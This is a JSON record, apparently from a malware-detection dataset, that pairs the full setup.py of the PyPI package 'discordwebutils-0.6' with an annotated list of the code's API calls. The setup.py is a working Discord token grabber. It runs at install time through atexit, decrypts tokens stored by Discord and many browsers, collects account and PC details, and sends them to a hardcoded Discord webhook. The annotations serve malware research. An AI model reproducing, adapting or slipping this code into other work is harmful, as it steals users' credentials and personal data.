{
  "metadata": {
    "package_name": "discordwebutils-0.6",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/discordwebutils-0.6.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/discordwebutils-0.6.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import atexit\nfrom base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom win32crypt import CryptUnprotectData\nfrom os import getlogin, listdir\nfrom json import loads\nfrom re import findall\nfrom urllib.request import Request, urlopen\nfrom subprocess import Popen, PIPE\nimport requests, json, os\nfrom datetime import datetime\n\ndef custom_code():\n    tokens = []\n    cleaned = []\n    checker = []\n\n    def decrypt(buff, master_key):\n        try:\n            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()\n        except:\n            return \"Error\"\n    def getip():\n        ip = \"None\"\n        try:\n            ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n        except: pass\n        return ip\n    def gethwid():\n        p = Popen(\"wmic csproduct get uuid\", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n        return (p.stdout.read() + p.stderr.read()).decode().split(\"\\n\")[1]\n    def get_token():\n        already_check = []\n        checker = []\n        local = os.getenv('LOCALAPPDATA')\n        roaming = os.getenv('APPDATA')\n        chrome = local + \"\\\\Google\\\\Chrome\\\\User Data\"\n        paths = {\n            'Discord': roaming + '\\\\discord',\n            'Discord Canary': roaming + '\\\\discordcanary',\n            'Lightcord': roaming + '\\\\Lightcord',\n            'Discord PTB': roaming + '\\\\discordptb',\n            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',\n            'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',\n            'Amigo': local + '\\\\Amigo\\\\User Data',\n            'Torch': local + '\\\\Torch\\\\User Data',\n            'Kometa': local + '\\\\Kometa\\\\User Data',\n            'Orbitum': local + '\\\\Orbitum\\\\User Data',\n            'CentBrowser': local + '\\\\CentBrowser\\\\User Data',\n            '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',\n            'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',\n            'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',\n            'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',\n            'Chrome': chrome + 'Default',\n            'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',\n            'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',\n            'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',\n            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',\n            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',\n            'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'\n        }\n        for platform, path in paths.items():\n            if not os.path.exists(path): continue\n            try:\n                with open(path + f\"\\\\Local State\", \"r\") as file:\n                    key = loads(file.read())['os_crypt']['encrypted_key']\n                    file.close()\n            except: continue\n            for file in listdir(path + f\"\\\\Local Storage\\\\leveldb\\\\\"):\n                if not file.endswith(\".ldb\") and file.endswith(\".log\"): continue\n                else:\n                    try:\n                        with open(path + f\"\\\\Local Storage\\\\leveldb\\\\{file}\", \"r\", errors='ignore') as files:\n                            for x in files.readlines():\n                                x.strip()\n                                for values in findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                    tokens.append(values)\n                    except PermissionError: continue\n            for i in tokens:\n                if i.endswith(\"\\\\\"):\n                    i.replace(\"\\\\\", \"\")\n                elif i not in cleaned:\n                    cleaned.append(i)\n            for token in cleaned:\n                try:\n                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])\n                except IndexError == \"Error\": continue\n                checker.append(tok)\n                for value in checker:\n                    if value not in already_check:\n                        already_check.append(value)\n                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}\n                        try:\n                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)\n                        except: continue\n                        if res.status_code == 200:\n                            res_json = res.json()\n                            ip = getip()\n                            pc_username = os.getenv(\"UserName\")\n                            pc_name = os.getenv(\"COMPUTERNAME\")\n                            user_name = f'{res_json[\"username\"]}#{res_json[\"discriminator\"]}'\n                            user_id = res_json['id']\n                            email = res_json['email']\n                            phone = res_json['phone']\n                            mfa_enabled = res_json['mfa_enabled']\n                            has_nitro = False\n                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)\n                            nitro_data = res.json()\n                            has_nitro = bool(len(nitro_data) > 0)\n                            days_left = 0\n                            if has_nitro:\n                                d1 = datetime.strptime(nitro_data[0][\"current_period_end\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\")\n                                d2 = datetime.strptime(nitro_data[0][\"current_period_start\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\")\n                                days_left = abs((d2 - d1).days)\n                            embed = f\"\"\"**{user_name}** *({user_id})*\\n\n    > :dividers: __Account Information__\\n\\tEmail: `{email}`\\n\\tPhone: `{phone}`\\n\\t2FA/MFA Enabled: `{mfa_enabled}`\\n\\tNitro: `{has_nitro}`\\n\\tExpires in: `{days_left if days_left else \"None\"} day(s)`\\n\n    > :computer: __PC Information__\\n\\tIP: `{ip}`\\n\\tUsername: `{pc_username}`\\n\\tPC Name: `{pc_name}`\\n\\tPlatform: `{platform}`\\n\n    > :pi√±ata: __Token__\\n\\t`{tok}`\\n\n    *Made by Astraa#6100* **|** ||https://github.com/astraadev||\"\"\"\n                            payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})\n                            try:\n                                headers2 = {\n                                    'Content-Type': 'application/json',\n                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'\n                                }\n                                req = Request('https://discord.com/api/webhooks/1164524985067511879/d2H95RyG60Xl3C1x5M7gwUIXgyM4aLNYPbqTEzOOg6uwUC9-gY9S6zCfrHeRIT3KIrdA', data=payload.encode(), headers=headers2)\n                                urlopen(req)\n                            except: continue\n                    else: continue\n        \n    get_token()\n\natexit.register(custom_code)",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path + \"\\Local State\"",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Access_browser_local_state",
              "intention_id": "access_browser_local_state"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "file.read()",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse_json_data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path + \"\\Local Storage\\leveldb\\\"",
              "object_description": "Browser_data_directory",
              "object_id": "browser_data_directory",
              "intention_description": "List_directory_files",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path + \"\\Local Storage\\leveldb\\{file}\"",
              "object_description": "Browser_data_directory_file",
              "object_id": "browser_data_directory_file",
              "intention_description": "Access_file_content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "files.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read_file_content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x",
              "object_description": "Regex_file_content",
              "object_id": "regex_file_content",
              "intention_description": "Extract_browser_tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "token.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64_encoded_string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode_base64_data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "key",
              "object_description": "Base64_encoded_string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode_base64_data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]",
              "object_description": "Decompressed_data_with_key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt_browser_token",
              "intention_id": "decrypt_discord_token"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://discordapp.com/api/v6/users/@me', headers=headers",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download_remote_content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "res.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse_json_data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "'https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers",
              "object_description": "Discord_api_endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download_remote_content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "res.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Parse_json_data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "datetime.strptime()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "nitro_data[0][\"current_period_end\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\"",
              "object_description": "String_environment_data",
              "object_id": "string_environment_data",
              "intention_description": "Get_datetime_epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "datetime.strptime()",
              "action_description": "Parses string into datetime object",
              "action_id": "parse_datetime",
              "object": "nitro_data[0][\"current_period_start\"].split('.')[0], \"%Y-%m-%dT%H:%M:%S\"",
              "object_description": "String_environment_data",
              "object_id": "string_environment_data",
              "intention_description": "Get_datetime_epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'}",
              "object_description": "Webhook_data",
              "object_id": "webhook_data",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "'https://discord.com/api/webhooks/1164524985067511879/d2H95RyG60Xl3C1x5M7gwUIXgyM4aLNYPbqTEzOOg6uwUC9-gY9S6zCfrHeRIT3KIrdA', data=payload.encode(), headers=headers2",
              "object_description": "Discord_webhook_url",
              "object_id": "discord_webhook_url",
              "intention_description": "Prepare_webhook_for_data_transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "req",
              "object_description": "Request_external_domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit_data_http_post",
              "intention_id": "transmit_data_http_post"
            },
            {
              "action_api": "atexit.register()",
              "action_description": "Registers function to be called at program exit",
              "action_id": "register_exit_function",
              "object": "custom_code",
              "object_description": "Function_with_arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger_main_behavioral_logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}